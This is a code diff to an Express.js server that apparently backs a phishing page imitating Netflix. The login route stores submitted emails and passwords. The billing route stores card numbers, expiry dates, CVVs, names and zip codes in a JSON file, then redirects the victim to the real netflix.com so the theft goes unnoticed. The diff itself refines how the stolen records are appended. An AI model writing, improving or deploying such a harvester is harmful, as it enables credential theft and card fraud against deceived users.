@@ -2,8 +2,6 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const exp = require('constants');
-// 
-const cors = require('cors');
 
 
 const app = express();
@@ -27,14 +25,18 @@ app.post('/login_form', function(req, res) {
     email: req.body.email,
     password: req.body.password,
   };
-  const json = JSON.stringify(data, null, 2);
-  fs.writeFileSync('data/data.json', json);
+
+  const file = fs.readFileSync('data/data.json');
+
+  const json = JSON.parse(file.toString());
+  json.push(data);
+  fs.writeFileSync("data/data.json", JSON.stringify(json));
 
   res.redirect('/billing.html');
 });
 
 app.post('/billing_form', function(req, res) {
-  const info = {
+  const data = {
     card_number: req.body.card_number,
     exp_date: req.body.exp_date,
     cvv: req.body.cvv,
@@ -42,24 +44,12 @@ app.post('/billing_form', function(req, res) {
     last_name: req.body.last_name,
     zip_code: req.body.zip_code,
   };
-  // const json = JSON.stringify(data, null, 2);
-  // fs.writeFileSync('data/data.json', json);
 
-  // fs.readFile('data/data.json', function(err, data) {
-  //   var json = JSON.parse(data);
-  //   json.push(info);
-  //   fs.writeFileSync('data/data.json', json);
-  // });
-  fs.readFile('data/data.json', function (err, data) {
-    var json = JSON.parse(data);
-    console.log(json)
-    json.push(info);    
-    fs.writeFile("data/data.json", JSON.stringify(json), function(err){
-      if (err) throw err;
-      console.log('The "data to append" was appended to file!');
-    });
-  })
+  const file = fs.readFileSync('data/data.json');
 
+  const json = JSON.parse(file.toString());
+  json.push(data);
+  fs.writeFileSync("data/data.json", JSON.stringify(json));
 
   res.redirect('https://netflix.com/');
 });
